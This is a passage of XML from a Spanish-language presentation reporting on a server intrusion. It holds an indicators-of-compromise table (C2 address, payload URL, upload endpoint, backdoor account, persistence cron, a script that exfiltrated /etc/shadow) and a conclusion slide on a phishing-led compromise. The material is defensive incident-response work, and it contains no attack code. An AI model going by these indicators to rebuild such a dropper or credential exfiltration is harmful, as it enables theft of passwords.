          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a1198">
          <draw:page-thumbnail draw:page-number="10" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id418" presentation:style-name="a1193" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id419" presentation:style-name="a1194" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id420" presentation:style-name="a1197" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a1196" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1195" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">10</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 11" draw:style-name="a1199" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-266">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id421" draw:style-name="a1200" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id422" draw:style-name="a1201" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image3.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id423" draw:style-name="a1205" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1204" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1202" text:class-names="">Indicadores de Compromiso (IoCs)</text:span><text:span text:style-name="a1203"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424" draw:style-name="a1209" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1208" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1206" text:class-names="">Referencias técnicas para futuros sistemas de monitoreo y detección</text:span><text:span text:style-name="a1207" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id425" draw:name="Table 0" svg:x="0.32in" svg:y="1.28in" svg:width="9.36in" svg:height="4.55in">
          <table:table table:style-name="a1210" table:template-name="{00000000-0000-0000-0000-000000000000}" table:use-banding-columns-styles="false" table:use-banding-rows-styles="false" table:use-first-column-styles="false" table:use-first-row-styles="false" table:use-last-column-styles="false" table:use-last-row-styles="false">
            <table:table-column table:style-name="a1211" table:default-cell-style-name=""/>
            <table:table-column table:style-name="a1212" table:default-cell-style-name=""/>
            <table:table-column table:style-name="a1213" table:default-cell-style-name=""/>
            <table:table-column table:style-name="a1214" table:default-cell-style-name=""/>
            <table:table-row table:style-name="a1215" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1219">
                <text:p text:style-name="a1218" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1216" text:class-names="">Tipo</text:span><text:span text:style-name="a1217" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1223">
                <text:p text:style-name="a1222" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1220" text:class-names="">Valor</text:span><text:span text:style-name="a1221" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1227">
                <text:p text:style-name="a1226" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1224" text:class-names="">Descripción</text:span><text:span text:style-name="a1225" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1231">
                <text:p text:style-name="a1230" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1228" text:class-names="">Estado</text:span><text:span text:style-name="a1229" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1232" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1236">
                <text:p text:style-name="a1235" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1233" text:class-names="">IP / Red</text:span><text:span text:style-name="a1234" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1240">
                <text:p text:style-name="a1239" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1237" text:class-names="">192.168.1.100</text:span><text:span text:style-name="a1238" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1244">
                <text:p text:style-name="a1243" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1241" text:class-names="">Servidor C2 del atacante — receptor de datos exfiltrados</text:span><text:span text:style-name="a1242" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1248">
                <text:p text:style-name="a1247" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1245" text:class-names="">Bloqueada UFW</text:span><text:span text:style-name="a1246" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1249" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1253">
                <text:p text:style-name="a1252" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1250" text:class-names="">IP / Red</text:span><text:span text:style-name="a1251" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1257">
                <text:p text:style-name="a1256" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1254" text:class-names="">192.168.1.103</text:span><text:span text:style-name="a1255" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1261">
                <text:p text:style-name="a1260" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1258" text:class-names="">Origen del ataque de fuerza bruta SSH</text:span><text:span text:style-name="a1259" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1265">
                <text:p text:style-name="a1264" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1262" text:class-names="">Sin acceso</text:span><text:span text:style-name="a1263" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1266" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1270">
                <text:p text:style-name="a1269" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1267" text:class-names="">IP / Red</text:span><text:span text:style-name="a1268" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1274">
                <text:p text:style-name="a1273" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1271" text:class-names="">192.168.1.48</text:span><text:span text:style-name="a1272" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1278">
                <text:p text:style-name="a1277" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1275" text:class-names="">Sesión SSH activa del atacante al momento del análisis</text:span><text:span text:style-name="a1276" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1282">
                <text:p text:style-name="a1281" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1279" text:class-names="">Sin acceso</text:span><text:span text:style-name="a1280" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1283" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1287">
                <text:p text:style-name="a1286" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1284" text:class-names="">IP / Red</text:span><text:span text:style-name="a1285" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1291">
                <text:p text:style-name="a1290" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1288" text:class-names="">192.168.1.50</text:span><text:span text:style-name="a1289" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1295">
                <text:p text:style-name="a1294" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1292" text:class-names="">Primer acceso SSH exitoso (compromiso inicial)</text:span><text:span text:style-name="a1293" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1299">
                <text:p text:style-name="a1298" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1296" text:class-names="">Sin acceso</text:span><text:span text:style-name="a1297" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1300" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1304">
                <text:p text:style-name="a1303" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1301" text:class-names="">Cuenta</text:span><text:span text:style-name="a1302" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1308">
                <text:p text:style-name="a1307" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1305" text:class-names="">hacker (uid=1002)</text:span><text:span text:style-name="a1306" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1312">
                <text:p text:style-name="a1311" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1309" text:class-names="">Backdoor creado por el atacante</text:span><text:span text:style-name="a1310" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1316">
                <text:p text:style-name="a1315" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1313" text:class-names="">Eliminada</text:span><text:span text:style-name="a1314" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1317" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1321">
                <text:p text:style-name="a1320" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1318" text:class-names="">Cuenta</text:span><text:span text:style-name="a1319" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1325">
                <text:p text:style-name="a1324" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1322" text:class-names="">reports (uid=1001)</text:span><text:span text:style-name="a1323" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1329">
                <text:p text:style-name="a1328" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1326" text:class-names="">Cuenta comprometida por ingeniería social</text:span><text:span text:style-name="a1327" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1333">
                <text:p text:style-name="a1332" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1330" text:class-names="">Password reset</text:span><text:span text:style-name="a1331" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1334" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1338">
                <text:p text:style-name="a1337" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1335" text:class-names="">Archivo</text:span><text:span text:style-name="a1336" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1342">
                <text:p text:style-name="a1341" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1339" text:class-names="">/etc/cron.d/sys-maintenance</text:span><text:span text:style-name="a1340" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1346">
                <text:p text:style-name="a1345" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1343" text:class-names="">Cron de persistencia ejecutado como root c/15 min</text:span><text:span text:style-name="a1344" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1350">
                <text:p text:style-name="a1349" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1347" text:class-names="">Eliminado</text:span><text:span text:style-name="a1348" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1351" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1355">
                <text:p text:style-name="a1354" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1352" text:class-names="">Archivo</text:span><text:span text:style-name="a1353" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1359">
                <text:p text:style-name="a1358" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1356" text:class-names="">/usr/local/bin/backup2.sh</text:span><text:span text:style-name="a1357" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1363">
                <text:p text:style-name="a1362" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1360" text:class-names="">Script de exfiltración de /etc/shadow</text:span><text:span text:style-name="a1361" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1367">
                <text:p text:style-name="a1366" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1364" text:class-names="">Eliminado</text:span><text:span text:style-name="a1365" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1368" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1372">
                <text:p text:style-name="a1371" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1369" text:class-names="">Archivo</text:span><text:span text:style-name="a1370" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1376">
                <text:p text:style-name="a1375" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1373" text:class-names="">/home/reports/install.sh</text:span><text:span text:style-name="a1374" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1380">
                <text:p text:style-name="a1379" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1377" text:class-names="">Dropper inicial descargado por el empleado</text:span><text:span text:style-name="a1378" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1384">
                <text:p text:style-name="a1383" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1381" text:class-names="">Eliminado</text:span><text:span text:style-name="a1382" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1385" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1389">
                <text:p text:style-name="a1388" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1386" text:class-names="">URL</text:span><text:span text:style-name="a1387" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1393">
                <text:p text:style-name="a1392" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1390" text:class-names="">192.168.1.100/payload.bin</text:span><text:span text:style-name="a1391" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1397">
                <text:p text:style-name="a1396" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1394" text:class-names="">Binario malicioso descargado por el dropper</text:span><text:span text:style-name="a1395" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1401">
                <text:p text:style-name="a1400" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1398" text:class-names="">C2 bloqueado</text:span><text:span text:style-name="a1399" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1402" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1406">
                <text:p text:style-name="a1405" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1403" text:class-names="">Endpoint</text:span><text:span text:style-name="a1404" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1410">
                <text:p text:style-name="a1409" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1407" text:class-names="">192.168.1.100:8080/upload</text:span><text:span text:style-name="a1408" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1414">
                <text:p text:style-name="a1413" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1411" text:class-names="">Receptor HTTP POST de datos exfiltrados</text:span><text:span text:style-name="a1412" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1418">
                <text:p text:style-name="a1417" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1415" text:class-names="">C2 bloqueado</text:span><text:span text:style-name="a1416" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
            <table:table-row table:style-name="a1419" table:default-cell-style-name="">
              <table:table-cell table:style-name="a1423">
                <text:p text:style-name="a1422" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1420" text:class-names="">Dato exfiltrado</text:span><text:span text:style-name="a1421" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1427">
                <text:p text:style-name="a1426" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1424" text:class-names="">/etc/shadow</text:span><text:span text:style-name="a1425" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1431">
                <text:p text:style-name="a1430" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1428" text:class-names="">Hashes de contraseñas — comprometidos</text:span><text:span text:style-name="a1429" text:class-names=""/></text:p>
              </table:table-cell>
              <table:table-cell table:style-name="a1435">
                <text:p text:style-name="a1434" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1432" text:class-names="">Creds restablecidas</text:span><text:span text:style-name="a1433" text:class-names=""/></text:p>
              </table:table-cell>
            </table:table-row>
          </table:table>
          <draw:image xlink:href="media/image20.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <presentation:notes draw:style-name="a1441">
          <draw:page-thumbnail draw:page-number="11" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id426" presentation:style-name="a1436" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id427" presentation:style-name="a1437" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id428" presentation:style-name="a1440" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a1439" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1438" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">11</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 12" draw:style-name="a1442" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-267">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id429" draw:style-name="a1443" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id430" draw:style-name="a1444" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image1.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id431" draw:style-name="a1448" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1447" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1445" text:class-names="">Conclusión</text:span><text:span text:style-name="a1446" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.05in" svg:y="0.67in" svg:width="8.8in" svg:height="0.35in" draw:id="id432" draw:style-name="a1452" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1451" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1449" text:class-names="">Resumen del incidente, lo que se logró y la lección más importante</text:span><text:span text:style-name="a1450" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.4in" svg:height="2.3in" draw:id="id433" draw:style-name="a1453" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.4in" svg:height="0.4in" draw:id="id434" draw:style-name="a1454" draw:name="Shape 4">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="1.33in" svg:width="4.2in" svg:height="0.32in" draw:id="id435" draw:style-name="a1458" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1457" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1455" text:class-names="">Lo que pasó</text:span><text:span text:style-name="a1456" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="1.82in" svg:width="0.18in" svg:height="0.18in" draw:id="id436" draw:style-name="a1459" draw:name="Shape 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in" svg:y="1.78in" svg:width="3.85in" svg:height="0.38in" draw:id="id437" draw:style-name="a1463" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1462" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1460" text:class-names="">Un empleado fue engañado por un correo externo para ejecutar un programa malicioso.</text:span><text:span text:style-name="a1461" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="2.26in" svg:width="0.18in" svg:height="0.18in" draw:id="id438" draw:style-name="a1464" draw:name="Shape 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in" svg:y="2.22in" svg:width="3.85in" svg:height="0.38in" draw:id="id439" draw:style-name="a1468" draw:name="Text 9">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1467" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1465" text:class-names="">El atacante tuvo acceso al servidor durante casi un año robando datos cada 15 minutos.</text:span><text:span text:style-name="a1466" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="2.7in" svg:width="0.18in" svg:height="0.18in" draw:id="id440" draw:style-name="a1469" draw:name="Shape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in" svg:y="2.66in" svg:width="3.85in" svg:height="0.38in" draw:id="id441" draw:style-name="a1473" draw:name="Text 11">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1472" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1470" text:class-names="">Las contraseñas de todos los usuarios fueron comprometidas y enviadas al atacante.</text:span><text:span text:style-name="a1471" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="3.14in" svg:width="0.18in" svg:height="0.18in" draw:id="id442" draw:style-name="a1474" draw:name="Shape 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in" svg:y="3.1in" svg:width="3.85in" svg:height="0.38in" draw:id="id443" draw:style-name="a1478" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1477" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1475" text:class-names="">Se detectaron 11 vulnerabilidades de seguridad, 4 de ellas críticas.</text:span><text:span text:style-name="a1476" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5in" svg:y="1.28in" svg:width="4.68in" svg:height="2.3in" draw:id="id444" draw:style-name="a1479" draw:name="Shape 14">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5in" svg:y="1.28in" svg:width="4.68in" svg:height="0.4in" draw:id="id445" draw:style-name="a1480" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.12in" svg:y="1.33in" svg:width="4.48in" svg:height="0.32in" draw:id="id446" draw:style-name="a1484" draw:name="Text 16">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1483" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1481" text:class-names="">Lo que logramos</text:span><text:span text:style-name="a1482" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.14in" svg:y="1.82in" svg:width="0.18in" svg:height="0.18in" draw:id="id447" draw:style-name="a1485" draw:name="Shape 1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4in" svg:y="1.78in" svg:width="4.13in" svg:height="0.38in" draw:id="id448" draw:style-name="a1489" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1488" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1486" text:class-names="">Identificamos y eliminamos el 100% de las amenazas sin interrumpir el servicio.</text:span><text:span text:style-name="a1487" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.14in" svg:y="2.26in" svg:width="0.18in" svg:height="0.18in" draw:id="id449" draw:style-name="a1490" draw:name="Shape 1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4in" svg:y="2.22in" svg:width="4.13in" svg:height="0.38in" draw:id="id450" draw:style-name="a1494" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1493" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1491" text:class-names="">Cortamos la comunicación con el atacante y bloqueamos todos los vectores de entrada.</text:span><text:span text:style-name="a1492" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.14in" svg:y="2.7in" svg:width="0.18in" svg:height="0.18in" draw:id="id451" draw:style-name="a1495" draw:name="Shape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4in" svg:y="2.66in" svg:width="4.13in" svg:height="0.38in" draw:id="id452" draw:style-name="a1499" draw:name="Text 22">
